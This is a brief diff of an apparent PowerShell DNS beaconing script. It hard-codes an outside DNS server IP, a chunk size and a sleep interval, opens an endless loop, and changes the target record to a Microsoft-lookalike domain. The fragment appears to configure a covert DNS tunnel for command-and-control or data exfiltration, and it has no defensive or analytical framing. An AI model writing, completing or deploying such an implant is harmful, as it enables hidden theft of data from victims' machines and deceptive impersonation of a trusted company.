@@ -1,7 +1,7 @@
 $previousPelet = $null
 $chunkSize = 60
 $dnsServer = "34.45.124.34"
-$dnsRecord = "rec.capitalgroupsecurity.com"
+$dnsRecord = "rec2.ftp-microsoft.com"
 $sleepInterval = "0.5"
 while ($true) {
     Start-Sleep -Seconds $sleepInterval
